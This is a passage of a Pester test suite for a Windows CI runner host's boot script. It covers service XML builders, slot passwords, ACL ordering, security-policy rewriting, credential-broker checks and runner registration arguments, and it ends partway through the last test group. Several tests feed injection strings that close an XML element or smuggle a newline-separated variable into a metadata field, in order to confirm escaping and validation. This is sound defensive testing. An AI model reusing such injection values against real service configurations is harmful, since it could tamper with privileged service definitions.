# Pester tests for the Windows host boot script's PURE functions.
#
# The companion file is windows-beacon.Tests.ps1 and its header applies here
# too: a gate that READS code is not a test, so the decidable half of the boot
# is written as functions with no side effects and this file RUNS them on
# ubuntu-latest.
#
# What this cannot cover is the half that only exists on a Windows host: the
# service control manager, the shim, the metadata server, local accounts. That
# half is proved by the boot probe on the host, where a failure refuses
# registration instead of serving jobs from a broken boundary.

BeforeAll {
    # $PSScriptRoot, not $PSCommandPath -- see the note in
    # windows-beacon.Tests.ps1 for what the difference costs.
    $script:StartupPath = Join-Path $PSScriptRoot '../../modules/ci-runner-host-pool/scripts/windows-host-startup.ps1'
    if (-not (Test-Path -LiteralPath $script:StartupPath)) {
        throw "the boot script is not at $script:StartupPath"
    }
    # Sampled either side of the import, for the reason spelled out in
    # windows-beacon.Tests.ps1: Pester sets $ErrorActionPreference to Stop inside
    # a test block on its own account, so reading the value in an `It` measures
    # Pester and calls it a result. The question is what the FILE changed.
    $script:EapBefore = $ErrorActionPreference
    $script:StrictBefore = try { $null = $script:NeverAssigned; $false } catch { $true }

    . $script:StartupPath

    $script:EapAfter = $ErrorActionPreference
    $script:StrictAfter = try { $null = $script:NeverAssigned; $false } catch { $true }
}

Describe 'dot-sourcing is inert' {
    # Same guard, same reason, as in windows-beacon.Tests.ps1: a script that
    # sets Set-StrictMode or $ErrorActionPreference at script scope reconfigures
    # whoever dot-sources it, and here that is Pester.
    It 'leaves the caller error preference exactly as it found it' {
        $script:EapAfter | Should -Be $script:EapBefore
    }

    It 'does not turn strict mode on in the caller' {
        $script:StrictAfter | Should -Be $script:StrictBefore
    }

    # The entry-point guard is the only thing standing between a dot-source and
    # a full host boot -- Invoke-Main creates directories, reads the metadata
    # server and installs a service.
    #
    # The assertion is that this test EXISTS to be run. A guard that let
    # Invoke-Main go would have called Deny-Boot on the missing
    # ci-github-owner metadata, thrown inside BeforeAll, and failed the whole
    # container before reaching here. So reaching here is the result, and the
    # two checks below confirm the import did the other half of its job.
    It 'defines its functions instead of running them' {
        Get-Command -Name 'Invoke-Main' -CommandType Function | Should -Not -BeNullOrEmpty
        Get-Command -Name 'Invoke-Phase0Preflight' -CommandType Function | Should -Not -BeNullOrEmpty
    }
}

Describe 'golden image assertion' {
    # The Linux script refuses a bare image with `[ -d /opt/actions-runner ]`.
    # A directory check is too weak on Windows: an image can carry a runner and
    # still predate the service shim, the beacon or the boot probe, and each of
    # those absences fails later and less legibly.
    It 'accepts an image at or above the floor' {
        Test-ImageVersion -Marker '3' -Floor 3 | Should -BeTrue
        Test-ImageVersion -Marker '4' -Floor 3 | Should -BeTrue
    }

    It 'refuses an image below the floor' {
        Test-ImageVersion -Marker '2' -Floor 3 | Should -BeFalse
    }

    It 'tolerates the trailing newline every file writer leaves' {
        Test-ImageVersion -Marker "3`r`n" -Floor 3 | Should -BeTrue
        Test-ImageVersion -Marker '  3  ' -Floor 3 | Should -BeTrue
    }

    # An unreadable marker must be a REFUSAL, not a pass. The tempting bug is to
    # treat "no marker" as an old image and carry on; a host that cannot say
    # what it is is not a host this pool knows how to run.
    It 'refuses a marker it cannot read as a number' {
        Test-ImageVersion -Marker '' -Floor 1 | Should -BeFalse
        Test-ImageVersion -Marker '   ' -Floor 1 | Should -BeFalse
        Test-ImageVersion -Marker 'v3' -Floor 1 | Should -BeFalse
        Test-ImageVersion -Marker '3.1' -Floor 1 | Should -BeFalse
        Test-ImageVersion -Marker '-1' -Floor 1 | Should -BeFalse
    }
}

Describe 'beacon service definition' {
    BeforeAll {
        $script:Xml = Get-BeaconServiceConfig -ScriptPath 'C:\ci\bin\ci-beacon.ps1' -IntervalSeconds 45
    }

    # The publisher stopping is the failure that strands a host:
    # `beacon_decision()` reads a stale beacon as keep, forever. A beacon that
    # dies once and stays dead is a machine that bills until somebody notices,
    # which on the Linux side took 2h55m the one time it happened.
    It 'restarts the beacon rather than leaving the host stranded' {
        $script:Xml | Should -Match '<onfailure action="restart"'
    }

    It 'comes back after a restart the host did not choose' {
        $script:Xml | Should -Match '<startmode>Automatic</startmode>'
    }

    # A profile on the image, or a prompt from anything the script calls, hangs
    # the service at start. The SCM reports that as a start failure, which looks
    # nothing like its cause.
    It 'starts powershell with no profile and no prompts' {
        $script:Xml | Should -Match '-NoProfile'
        $script:Xml | Should -Match '-NonInteractive'
    }

    # C:\ci\bin has no space in it today. Someone moving it is exactly the
    # change that would not be re-tested, and an unquoted path there silently
    # truncates the argument list into a service that starts and does nothing.
    It 'quotes the script path against a directory with a space in it' {
        # &quot;, not " -- the argument string is XML-escaped now, exactly as the
        # broker's is, and the shim's parser decodes it back to a quote before
        # anything sees it. Asserting the raw quote here would be asserting that
        # the two service builders differ.
        Get-BeaconServiceConfig -ScriptPath 'C:\ci apps\bin\ci-beacon.ps1' |
        Should -Match '-File &quot;C:\\ci apps\\bin\\ci-beacon\.ps1&quot;'
    }

    # The beacon builder used to interpolate its inputs raw while the broker's
    # escaped them. Both take module constants today, so neither was injectable;
    # the divergence itself is the defect, because the next caller reuses
    # whichever builder it finds first.
    It 'escapes its inputs the same way the broker builder does' {
        $xml = Get-BeaconServiceConfig -ScriptPath 'C:\ci\bin\b.ps1' `
            -ServiceName 'x"/><env name="EVIL" value="1'
        $xml | Should -Not -Match '<env name="EVIL"'
    }

    It 'passes the interval through instead of hardcoding one' {
        $script:Xml | Should -Match '-IntervalSeconds 45'
    }

    # The service id is what phase 0 starts by name. It was ALSO what phase 2
    # exempted from the metadata fence by service SID; section 3A deleted the fence, so
    # this string now has two owners rather than three. Two files still have to
    # agree on it and only this test compares them.
    It 'is named the same thing the starter uses' {
        $script:Xml | Should -Match '<id>ci-beacon</id>'
    }
}

Describe 'slot naming' {
    # The controller parses `<instance>-s<i>` back to an instance in
    # orphan_decision(). A rename on this side does not fail: it silently stops
    # every Windows registration from ever being reaped, and the agents pile up in
    # GitHub's list pointing at hosts that no longer exist.
    It 'matches the name orphan_decision parses back to an instance' {
        Get-SlotUserName -Index 1 | Should -Be 'ci-s1'
        Get-SlotUserName -Index 12 | Should -Be 'ci-s12'
    }

    It 'gives each slot its own workspace' {
        $one = Get-SlotWorkspacePath -Index 1 -Root '/ci/slots'
        $two = Get-SlotWorkspacePath -Index 2 -Root '/ci/slots'
        $one | Should -Not -Be $two
    }

    # The temp directory is UNDER the workspace, not beside it, so the one ACL
    # applied to the workspace covers it. A sibling directory is one more thing to
    # remember to lock, and the one nobody does.
    It 'puts the private temp inside the slot it belongs to' {
        $ws = Get-SlotWorkspacePath -Index 3 -Root '/ci/slots'
        $tmp = Get-SlotTempPath -Index 3 -Root '/ci/slots'
        $tmp.StartsWith($ws) | Should -BeTrue
        $tmp | Should -Not -Be $ws
    }
}

Describe 'slot password' {
    # Complexity is satisfied BY CONSTRUCTION, not by luck. A password Windows
    # rejects is a slot that never registers, discovered on the fleet rather than
    # here -- so this runs the generator enough times that a one-class-missing bug
    # cannot hide behind a lucky draw.
    It 'always carries all four character classes' {
        foreach ($i in 1..50) {
            $chars = -join (Get-SlotPasswordCharacter -Length 20)
            $chars | Should -Match '[A-Z]'
            $chars | Should -Match '[a-z]'
            $chars | Should -Match '[0-9]'
            $chars | Should -Match '[_\-.~]'
        }
    }

    It 'is the length it was asked for' {
        (Get-SlotPasswordCharacter -Length 40).Length | Should -Be 40
        (Get-SlotPasswordCharacter -Length 16).Length | Should -Be 16
    }

    # This value reaches the service control manager. A quote, a backtick, a
    # percent or an ampersand in it is a quoting bug in the one place where the
    # string is a credential; the homoglyphs are out because a password that
    # cannot be read off a console during an incident wastes the incident.
    It 'contains nothing that quotes, expands or reads ambiguously' {
        foreach ($i in 1..50) {
            # I, O, l, o, 0 and 1 are out; lowercase i is not a homoglyph of
            # anything in this alphabet once uppercase I is already gone.
            -join (Get-SlotPasswordCharacter -Length 40) | Should -Match '^[A-HJ-NP-Za-km-np-z2-9_.~-]+$'
        }
    }

    It 'refuses a length that cannot satisfy the classes' {
        { Get-SlotPasswordCharacter -Length 3 } | Should -Throw
    }

    It 'does not hand out the same password twice' {
        $first = -join (Get-SlotPasswordCharacter -Length 40)
        $second = -join (Get-SlotPasswordCharacter -Length 40)
        $first | Should -Not -Be $second
    }

    # Read-only matters: a SecureString still writable after the fact is one a
    # later bug can extend or empty between generating it and registering the
    # service with it.
    It 'hands phase 5 a sealed SecureString, never a string' {
        $secure = Get-SlotPassword -Length 24
        $secure | Should -BeOfType [System.Security.SecureString]
        $secure.Length | Should -Be 24
        $secure.IsReadOnly() | Should -BeTrue
    }
}

Describe 'phase 1 ordering' {
    # THIS IS THE SECURITY TEST OF PHASE 1, AND IT IS ABOUT ORDER, NOT CONTENT.
    #
    # C:\ci\bin holds ci-beacon.ps1, which the SCM re-executes as LocalSystem on
    # every service restart and every reboot. Phase 0 created that directory with
    # whatever ACL C:\ hands down, which is harmless only while the host has no
    # unprivileged principal on it. Create the slot accounts first and there is a
    # window -- one that survives the reboot -- in which a slot can write the file
    # that comes back as SYSTEM.
    #
    # Nothing about that ordering is visible in the code's shape, and a later
    # refactor that groups "all the account work" together would reverse it
    # without looking wrong. So the order is recorded and asserted.
    BeforeEach {
        $script:Calls = @()
        Mock -CommandName Protect-CiDirectory -MockWith { $script:Calls += "protect:$Path" }
        Mock -CommandName Initialize-SlotAccount -MockWith {
            $script:Calls += "account:$Index"
            @{ Index = $Index; User = "ci-s$Index" }
        }
        Mock -CommandName Grant-SlotLogonRight -MockWith { $script:Calls += 'rights' }
        Mock -CommandName Write-BootLog -MockWith { }
    }

    It 'locks the beacon directory before any slot account exists' {
        Invoke-Phase1SlotSetup -Slots 2 | Out-Null
        $firstAccount = [array]::FindIndex([string[]] $script:Calls, [Predicate[string]] { $args[0] -like 'account:*' })
        $lastProtect = [array]::FindLastIndex([string[]] $script:Calls, [Predicate[string]] { $args[0] -eq 'protect:C:\ci\bin' })
        $lastProtect | Should -BeGreaterOrEqual 0
        $firstAccount | Should -BeGreaterThan $lastProtect
    }

    It 'locks the root and the slot root too, not only the bin' {
        Invoke-Phase1SlotSetup -Slots 1 | Out-Null
        $script:Calls | Should -Contain 'protect:C:\ci'
        $script:Calls | Should -Contain 'protect:C:\ci\slots'
    }

    # One policy write, after every account exists. Per-slot imports mean N full
    # policy writes, any one of which is the one that gets interrupted -- leaving
    # a host with the grant applied and the denies not, which is the state this
    # whole section exists to prevent.
    It 'applies logon rights once, after every account is made' {
        Invoke-Phase1SlotSetup -Slots 3 | Out-Null
        @($script:Calls | Where-Object { $_ -eq 'rights' }).Count | Should -Be 1
        $script:Calls[-1] | Should -Be 'rights'
    }

    It 'provisions exactly the number of slots it was given' {
        Invoke-Phase1SlotSetup -Slots 3 | Out-Null
        @($script:Calls | Where-Object { $_ -like 'account:*' }).Count | Should -Be 3
    }
}

Describe 'security policy rewriting' {
    # The \r? in every anchored pattern below is load-bearing, not noise. The INF
    # this code writes is CRLF on purpose (secedit reads nothing else), and .NET's
    # multiline $ anchors before the \n with the \r still ahead of it, so a bare $
    # never matches a line of the very file format under test.
    # A fresh image has no SeDenyNetworkLogonRight line at all. Skipping an absent
    # privilege is how a deny the code claims to apply ends up not applied, and
    # nothing downstream would report it: secedit imports the file happily and the
    # slots keep the right they were supposed to lose.
    It 'adds a privilege the exported policy never had' {
        $inf = "[Unicode]`r`nUnicode=yes`r`n[Privilege Rights]`r`nSeServiceLogonRight = *S-1-5-80-0`r`n"
        $out = Edit-InfPrivilege -InfText $inf -Privilege 'SeDenyNetworkLogonRight' -Accounts @('*S-1-5-21-1-1-1-1001')
        $out | Should -Match '(?m)^SeDenyNetworkLogonRight = \*S-1-5-21-1-1-1-1001\r?$'
        $out | Should -Match '(?m)^SeServiceLogonRight = \*S-1-5-80-0\r?$'
    }

    # REPLACED, not appended to. Appending leaves the previous membership in
    # place, which for a deny right reads as working and for SeServiceLogonRight
    # quietly widens who may log on as a service.
    It 'replaces an existing line instead of appending to it' {
        $inf = "[Privilege Rights]`r`nSeDenyNetworkLogonRight = *S-1-5-32-546`r`n"
        $out = Edit-InfPrivilege -InfText $inf -Privilege 'SeDenyNetworkLogonRight' -Accounts @('*S-1-5-21-9')
        $out | Should -Match '(?m)^SeDenyNetworkLogonRight = \*S-1-5-21-9\r?$'
        $out | Should -Not -Match 'S-1-5-32-546'
        ([regex]::Matches($out, 'SeDenyNetworkLogonRight')).Count | Should -Be 1
    }

    It 'creates the section when the export has none' {
        $out = Edit-InfPrivilege -InfText "[Unicode]`r`nUnicode=yes" -Privilege 'SeServiceLogonRight' -Accounts @('*S-1-5-21-7')
        $out | Should -Match '(?m)^\[Privilege Rights\]\r?$'
        $out | Should -Match '(?m)^SeServiceLogonRight = \*S-1-5-21-7\r?$'
    }

    It 'writes every account on the one line secedit reads' {
        $out = Edit-InfPrivilege -InfText '[Privilege Rights]' -Privilege 'SeServiceLogonRight' `
            -Accounts @('*S-1-5-21-1', '*S-1-5-21-2', '*S-1-5-21-3')
        $out | Should -Match '(?m)^SeServiceLogonRight = \*S-1-5-21-1,\*S-1-5-21-2,\*S-1-5-21-3\r?$'
    }

    # An INF is a Windows file and secedit is a Windows tool: a rewrite that
    # emitted bare LF would be read back by an OS that expects CRLF, and the
    # failure mode is a policy import that reports success having applied part of
    # the file.
    It 'keeps the line endings secedit expects' {
        $out = Edit-InfPrivilege -InfText "[Privilege Rights]`r`nSeServiceLogonRight = *S-1-5-80-0`r`n" `
            -Privilege 'SeDenyInteractiveLogonRight' -Accounts @('*S-1-5-21-4')
        $out | Should -Match "`r`n"
        ($out -split "`r`n" | Where-Object { $_ -match '^\[Privilege Rights\]$' }).Count | Should -Be 1
    }

    # Nothing outside the one line changes. secedit's INF carries sections this
    # script has no business editing, and a rewrite that dropped [Unicode] gives
    # an import failure whose message is about encoding.
    It 'leaves every other line of the policy alone' {
        $inf = "[Unicode]`r`nUnicode=yes`r`n[Version]`r`nsignature=`"`$CHICAGO`$`"`r`n[Privilege Rights]`r`nSeBatchLogonRight = *S-1-5-32-544`r`n"
        $out = Edit-InfPrivilege -InfText $inf -Privilege 'SeServiceLogonRight' -Accounts @('*S-1-5-21-5')
        $out | Should -Match '(?m)^Unicode=yes\r?$'
        $out | Should -Match '(?m)^signature='
        $out | Should -Match '(?m)^SeBatchLogonRight = \*S-1-5-32-544\r?$'
    }
}

# --- phase 3, the job credential broker ---------------------------------------

Describe 'job service account validation' {
    # Instance metadata is a trust boundary on a Windows pool -- section 3A accepts that
    # job code can read it and does not assume nothing can write it. The value
    # lands in service XML and in a LocalSystem service's environment block, so
    # the check is a whitelist of the shape, not a blacklist of characters.
    It 'accepts a service-account address' {
        Test-JobServiceAccountName -Name 'ci-job@example-project.iam.gserviceaccount.com' | Should -BeTrue
    }

    It 'rejects nothing at all' {
        Test-JobServiceAccountName -Name '' | Should -BeFalse
        Test-JobServiceAccountName -Name '   ' | Should -BeFalse
        Test-JobServiceAccountName -Name $null | Should -BeFalse
    }

    # The two shapes that would turn a value into markup or into a second
    # variable. Escaping handles the first anyway; this is the half that stops a
    # WELL-FORMED document from saying something other than what phase 3 meant.
    It 'rejects a value that could close an element or open a line' {
        Test-JobServiceAccountName -Name 'a@b.com"/><env name="X" value="y' | Should -BeFalse
        Test-JobServiceAccountName -Name "a@b.com`nCI_BROKER_PORT=1" | Should -BeFalse
    }

    It 'rejects something that is not an address' {
        Test-JobServiceAccountName -Name 'ci-job' | Should -BeFalse
        Test-JobServiceAccountName -Name 'ci-job@localhost' | Should -BeFalse
    }
}

Describe 'broker port parsing' {
    It 'takes a port metadata actually set' {
        Get-BrokerPort -Value '9099' | Should -Be 9099
    }

    # Falling back is right for the port and would be WRONG for the account: a
    # default port serves the same broker, a default identity is somebody else's.
    It 'falls back when metadata says nothing' {
        Get-BrokerPort -Value '' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value $null | Should -Be $script:DefaultBrokerPort
    }

    It 'falls back on anything that is not a whole number' {
        Get-BrokerPort -Value '80 80' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value '-1' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value '8.0' | Should -Be $script:DefaultBrokerPort
    }

    It 'falls back outside the range a socket would accept' {
        Get-BrokerPort -Value '0' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value '65536' | Should -Be $script:DefaultBrokerPort
    }

    # The ephemeral range binds fine and then loses the port to an outbound socket,
    # which reads in the log as a broker that installed and never answered. 49151 is
    # here so the boundary is asserted rather than the direction.
    It 'falls back inside the ephemeral range, and only inside it' {
        Get-BrokerPort -Value '49152' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value '65535' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value '49151' | Should -Be 49151
    }

    # This case was a real defect, found by running the function rather than by
    # reading it. All-digits is not the same thing as a number that fits, and
    # `[int64] '99999999999999999999'` THROWS -- which under the entry point's
    # $ErrorActionPreference = 'Stop' is a dead host with a cast error in its log
    # instead of a live one on the default port.
    It 'falls back on a number too large to be one, instead of throwing' {
        { Get-BrokerPort -Value '99999999999999999999' } | Should -Not -Throw
        Get-BrokerPort -Value '99999999999999999999' | Should -Be $script:DefaultBrokerPort
    }
}

Describe 'broker service definition' {
    BeforeAll {
        $script:BrokerXml = Get-BrokerServiceConfig -ScriptPath 'C:\ci\bin\job-metadata-broker.py' `
            -JobServiceAccount 'ci-job@example-project.iam.gserviceaccount.com' -Port 8081
    }

    # Loopback, not 0.0.0.0 as on Linux. Windows gives the slots no network
    # namespace of their own, so binding the VM's address would widen who can
    # reach a credential vendor without narrowing anything for the slots.
    It 'binds loopback and never the host address' {
        $script:BrokerXml | Should -Match '<env name="CI_BROKER_HOST" value="127\.0\.0\.1"/>'
        $script:BrokerXml | Should -Not -Match '0\.0\.0\.0'
    }

    It 'vends the identity it was given, on the port it was given' {
        $script:BrokerXml | Should -Match 'CI_JOB_SERVICE_ACCOUNT" value="ci-job@example-project\.iam\.gserviceaccount\.com"'
        $script:BrokerXml | Should -Match 'CI_BROKER_PORT" value="8081"'
    }

    # Escaping is the half that survives a value the caller's validation did not
    # see -- a future caller, a future metadata key. The angle bracket must come
    # out as text, so the document still has exactly the elements phase 3 wrote.
    It 'escapes a hostile value into text rather than markup' {
        $xml = Get-BrokerServiceConfig -ScriptPath 'C:\ci\bin\b.py' `
            -JobServiceAccount 'x"/><env name="EVIL" value="1' -Port 8081
        $xml | Should -Not -Match '<env name="EVIL"'
        $xml | Should -Match '&quot;|&lt;'
    }

    # A broker that dies stops every job on the host from authenticating. The
    # service manager restarting it is the only thing watching.
    It 'restarts itself rather than staying dead' {
        $script:BrokerXml | Should -Match '<onfailure action="restart"'
        $script:BrokerXml | Should -Match '<startmode>Automatic</startmode>'
    }
}

# --- phase 4, the per-job credential reset hooks -------------------------------

Describe 'credential reset hook body' {
    BeforeAll { $script:Hook = Get-JobHookScript }

    # The hook runs inside the agent's environment. %USERPROFILE% and %APPDATA%
    # are values a job could have changed, so what gets deleted would be the
    # job's decision rather than the host's. The account database is not.
    It 'resolves the profile from the account database, not the environment' {
        $script:Hook | Should -Match 'ProfileList'
        $script:Hook | Should -Match 'ProfileImagePath'
        $code = ($script:Hook -split "`n" | Where-Object { $_ -notmatch '^\s*#' }) -join "`n"
        $code | Should -Not -Match '\$env:USERPROFILE'
        $code | Should -Not -Match '\$env:APPDATA'
    }

    # A resolution that somehow yields C:\Users\Administrator must abort, not
    # recurse. This is the difference between a cleanup and an incident.
    It 'refuses a profile that is not a slot profile' {
        $script:Hook | Should -Match "notmatch '\^ci-s\[0-9\]\+\`$'"
        $script:Hook | Should -Match 'exit 1'
    }

    It 'removes the credential state a previous job could have left' {
        $script:Hook | Should -Match 'AppData\\Roaming\\gcloud'
        $script:Hook | Should -Match 'AppData\\Roaming\\gsutil'
        $script:Hook | Should -Match 'Remove-Item -LiteralPath \$target -Recurse -Force'
    }

    # A hook whose meaning a job's own preference variables could change is not a
    # control. It sets its own.
    It 'sets its own error handling rather than inheriting the agent''s' {
        $script:Hook | Should -Match 'Set-StrictMode -Version Latest'
        $script:Hook | Should -Match "\`$ErrorActionPreference = 'Stop'"
    }
}

Describe 'slot service environment' {
    # THE ASSERTION THIS WHOLE DESCRIBE EXISTS FOR. A pool with no job service
    # account starts no broker, and it is the pool where an inherited or ambient
    # credential is MOST dangerous: nothing on the host is competing with whatever
    # the last workflow left behind, so the leftover is simply what the next job
    # authenticates as. The hooks clear the leftover; the GCE_METADATA_* values
    # close the other door. All five are set here, and the second half is why:
    # unset, GCE_METADATA_* does not withhold credentials, it hands ADC back to
    # 169.254.169.254 and the HOST service account, because section 3A deleted the
    # fence that gives Linux that property for free.
    It 'sets both hooks when there is no broker at all' {
        $block = Get-SlotServiceEnvironment -Index 1 -BrokerEndpoint '' -SlotRoot '/ci/slots'
        $block['ACTIONS_RUNNER_HOOK_JOB_STARTED'] | Should -Be $script:JobHookPath
        $block['ACTIONS_RUNNER_HOOK_JOB_COMPLETED'] | Should -Be $script:JobHookPath
        $block['GCE_METADATA_HOST'] | Should -Be $script:ClosedMetadataEndpoint
        $block['GCE_METADATA_IP'] | Should -Be $script:ClosedMetadataEndpoint
        $block['GCE_METADATA_ROOT'] | Should -Be $script:ClosedMetadataEndpoint
    }

    It 'sets both hooks when there is one' {
        $block = Get-SlotServiceEnvironment -Index 1 -BrokerEndpoint '127.0.0.1:8081' -SlotRoot '/ci/slots'
        $block['ACTIONS_RUNNER_HOOK_JOB_STARTED'] | Should -Be $script:JobHookPath
        $block['ACTIONS_RUNNER_HOOK_JOB_COMPLETED'] | Should -Be $script:JobHookPath
    }

    # All three, or the client libraries disagree about where the metadata server
    # is and one of them reaches the real one -- which answers with the HOST's
    # identity, the exact downgrade the broker exists to prevent.
    It 'points every metadata client at the broker when there is one' {
        $block = Get-SlotServiceEnvironment -Index 2 -BrokerEndpoint '127.0.0.1:8081' -SlotRoot '/ci/slots'
        $block['GCE_METADATA_HOST'] | Should -Be '127.0.0.1:8081'
        $block['GCE_METADATA_IP'] | Should -Be '127.0.0.1:8081'
        $block['GCE_METADATA_ROOT'] | Should -Be '127.0.0.1:8081'
    }

    # The affinity label is what a workflow run pins its later jobs to. Every
    # slot on one host gets the SAME value -- it names the host, not the slot --
    # which is the property the anchor job depends on: any slot that answers can
    # publish it, and every consumer that lands anywhere on this host is served.
    It 'hands every slot on a host the same affinity label' {
        $one = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots' -HostLabel 'host-ci-win-abcd'
        $two = Get-SlotServiceEnvironment -Index 2 -SlotRoot '/ci/slots' -HostLabel 'host-ci-win-abcd'
        $one['CI_HOST_LABEL'] | Should -Be 'host-ci-win-abcd'
        $two['CI_HOST_LABEL'] | Should -Be 'host-ci-win-abcd'
    }

    # Absent, not empty. An empty CI_HOST_LABEL would be a string the anchor's
    # `-z` test still catches, but a host that publishes the variable at all is
    # claiming to support the contract -- and one that publishes it EMPTY would
    # pin a run to the label `host-`, which nothing answers. Saying nothing is
    # the only reading that degrades to unpinned scheduling.
    It 'omits the affinity label rather than publishing an empty one' {
        $block = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots'
        $block.Contains('CI_HOST_LABEL') | Should -BeFalse
        $blank = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots' -HostLabel '   '
        $blank.Contains('CI_HOST_LABEL') | Should -BeFalse
    }

    # Per service, never machine-wide: a machine-wide TMP hands every slot the
    # same one, which is the collision the per-slot directory removes.
    It 'gives each slot its own temp' {
        $one = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots'
        $two = Get-SlotServiceEnvironment -Index 2 -SlotRoot '/ci/slots'
        $one['TMP'] | Should -Be $one['TEMP']
        $one['TMP'] | Should -Not -Be $two['TMP']
    }
}

# The job hook is a FILE locked by the same function that locks the directories,
# and .NET does not let a file ACE carry inheritance flags -- AddAccessRule throws
# "No flags can be set" rather than ignoring them. Under the entry point's
# 'Stop' preference that throw is a host that never finishes booting, so the
# distinction is asserted here rather than discovered there.
Describe 'acl inheritance flags' {
    It 'makes a directory ACE inheritable' {
        $flags = Get-AclInheritanceFlag -IsContainer $true
        $flags.HasFlag([System.Security.AccessControl.InheritanceFlags]::ContainerInherit) | Should -BeTrue
        $flags.HasFlag([System.Security.AccessControl.InheritanceFlags]::ObjectInherit) | Should -BeTrue
    }

    It 'gives a file ACE no flags at all, because .NET rejects any' {
        Get-AclInheritanceFlag -IsContainer $false |
            Should -Be ([System.Security.AccessControl.InheritanceFlags]::None)
    }
}

# THE DISTINCTION THIS SUITE EXISTS FOR MOST
#
# Get-MetadataValue used to swallow every exception into '', which made a flaky
# read indistinguishable from an unset attribute. Two attributes make that
# fatal: an unread ci-job-service-account turns a broker pool into a no-broker
# pool, and an unread ci-image-min-version drops the image floor to 1 and lets a
# host boot from an image with no shim. Neither failure says anything in the log
# that a healthy boot does not also say.
Describe 'metadata read failures' {
    It 'treats a 404 as an attribute that is genuinely not set' {
        Test-MetadataAbsence -StatusCode 404 | Should -BeTrue
    }

    # The case the old handler got wrong, and the one that actually happens: a
    # refused connection, a DNS failure or a read timeout never produces an HTTP
    # status at all.
    It 'refuses to read a transport failure as an unset attribute' {
        Test-MetadataAbsence -StatusCode $null | Should -BeFalse
    }

    It 'refuses to read a server error as an unset attribute' {
        Test-MetadataAbsence -StatusCode 500 | Should -BeFalse
        Test-MetadataAbsence -StatusCode 503 | Should -BeFalse
        Test-MetadataAbsence -StatusCode 403 | Should -BeFalse
    }

    It 'reads the status the same whether it arrives as an enum or a number' {
        Test-MetadataAbsence -StatusCode ([System.Net.HttpStatusCode]::NotFound) | Should -BeTrue
        Test-MetadataAbsence -StatusCode ([System.Net.HttpStatusCode]::InternalServerError) |
            Should -BeFalse
    }
}

# A vended token proves a broker is THERE, not that it is OURS. Every slot on a
# Windows host shares one loopback, nothing reserves the broker's port, and the
# shim's restart delay leaves it free for ten seconds after any crash -- long
# enough for a process a previous job left behind to take it and answer with a
# metadata document of its own choosing.
Describe 'broker listener ownership' {
    It 'accepts the one SID a slot account can never hold' {
        Test-BrokerListenerSid -Sid 'S-1-5-18' | Should -BeTrue
    }

    It 'rejects a local account, which is what a squatter would be' {
        Test-BrokerListenerSid -Sid 'S-1-5-21-1-2-3-1001' | Should -BeFalse
    }

    # Get-PortListenerSid returns '' for no listener, a process that exited
    # between the two lookups, and a CIM call that did not answer. All three mean
    # "not ours", and this is where that reading is made explicit.
    It 'reads an unknown owner as not ours rather than as ours' {
        Test-BrokerListenerSid -Sid '' | Should -BeFalse
        Test-BrokerListenerSid -Sid '   ' | Should -BeFalse
        Test-BrokerListenerSid -Sid $null | Should -BeFalse
    }

    It 'ignores the whitespace a CIM property arrives with' {
        Test-BrokerListenerSid -Sid " S-1-5-18`n" | Should -BeTrue
    }
}

# The reservation is the only thing that makes 127.0.0.1:1 a CLOSED endpoint
# rather than a free one. A netsh call that names the wrong protocol or a range
# of the wrong length protects nothing, and there is no way to notice that on a
# host afterwards: the port is simply available the day somebody wants it.
Describe 'closed metadata endpoint' {
    It 'reserves exactly one TCP port, at the port it was given' {
        $args1 = Get-PortReservationArgument -Port 1
        $args1 | Should -Contain 'protocol=tcp'
        $args1 | Should -Contain 'startport=1'
        $args1 | Should -Contain 'numberofports=1'
        $args1 | Should -Contain 'excludedportrange'
    }

    It 'passes the port through instead of hardcoding one' {
        Get-PortReservationArgument -Port 9999 | Should -Contain 'startport=9999'
    }

    # The constant and the port must name the same socket. They are read in two
    # different phases -- the port by phase 3's reservation, the endpoint by the
    # slot environment block -- so nothing but this compares them.
    It 'reserves the port the slots are actually pointed at' {
        $script:ClosedMetadataEndpoint | Should -Be "127.0.0.1:$script:ClosedMetadataPort"
    }

    # Not the broker's default, and not the real metadata server. Either would
    # turn the fail-closed endpoint back into a working one.
    It 'is not a port anything on this host answers on' {
        $script:ClosedMetadataPort | Should -Not -Be $script:DefaultBrokerPort
        $script:ClosedMetadataEndpoint | Should -Not -Match '169\.254\.169\.254'
    }
}

# --- phase 5 -----------------------------------------------------------------

Describe 'runner config arguments' {
    # The recycle contract and the 90-minute stall this pool replaces both live in
    # this argument list, and every one of them is a silent loss: a runner that
    # self-updates is alive, offline and undispatchable, and on a warm host that
    # is K slots at once rather than one short-lived VM.
    It 'pins the agent version by refusing the self-update' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        $a | Should -Contain '--disableupdate'
    }

    # A rebooted host has an agent of this name already in GitHub's list, and a
    # refused registration is a slot that never comes back.
    It 'replaces the registration a reboot left behind' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        $a | Should -Contain '--replace'
        $a | Should -Contain '--unattended'
        $a | Should -Contain '--runasservice'
    }

    # No account flags, ever. config.cmd takes a logon password as a plaintext
    # argument, in the process table of a host whose local accounts run
    # pull-request code; the logon account is set afterwards through
    # ChangeServiceConfigW instead.
    It 'passes no logon account and no password' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        ($a -join ' ') | Should -Not -Match 'logon'
        ($a -join ' ') | Should -Not -Match 'password'
    }

    It 'builds the repository url from the owner and repo' {
        $a = Get-RunnerConfigArgument -Owner 'acme' -Repo 'infra' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        $a[[array]::IndexOf($a, '--url') + 1] | Should -Be 'https://github.com/acme/infra'
    }

    # An empty label string must not become a `--labels ''` pair: PowerShell 5.1
    # drops an empty native-command argument, so config.cmd would see `--labels`
    # followed by whatever came next and register with the wrong flag value.
